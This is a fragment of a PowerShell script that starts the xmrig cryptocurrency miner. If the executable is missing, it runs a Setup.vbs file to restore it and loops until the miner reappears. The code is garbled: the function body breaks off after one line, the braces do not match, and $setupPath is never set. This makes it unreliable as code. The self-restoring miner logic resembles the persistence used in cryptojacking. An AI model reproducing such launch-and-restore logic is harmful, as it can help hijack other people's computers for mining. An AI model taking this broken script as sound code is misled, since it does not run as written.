$xmrigPath = "C:\xmrig\xmrig-6.26.0\xmrig.exe"
$xmrigProcessName = "xmrig"
$global:isStarting = $false

function Start-CoinRun {
    $existing = Get-Process -Name $xmrigProcessName -ErrorAction SilentlyContinue
if (Test-Path $xmrigPath) {
    Start-CoinRun
} else {
    Write-Warning "xmrig.exe not found."
    if (Test-Path $setupPath) {
        Write-Host "Running Setup.vbs to restore xmrig..."
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
        while (!(Test-Path $xmrigPath)) {
            Write-Host "Waiting for xmrig.exe..."
            Start-Sleep -Seconds 3
        }
        Start-CoinRun
    } else {
        Write-Error "Setup.vbs not found at $setupPath"
    }
  }
}
